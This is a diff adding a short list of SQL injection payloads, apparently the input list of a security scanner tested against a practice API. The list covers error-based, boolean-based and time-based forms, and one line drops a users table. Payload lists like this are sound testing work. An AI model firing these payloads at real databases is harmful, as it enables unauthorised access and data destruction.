@@ -1,0 +1,15 @@
+# Static SQL injection payloads (one per line; # comments ignored).
+# Error-based and boolean-based:
+'
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+') OR ('1'='1
+'; DROP TABLE users--
+1' ORDER BY 10--
+' UNION SELECT NULL--
+admin'--
+# Time-based (do not delay on SQLite; here for other engines / crAPI):
+' OR SLEEP(5)--
+'); WAITFOR DELAY '0:0:5'--
+' || pg_sleep(5)--
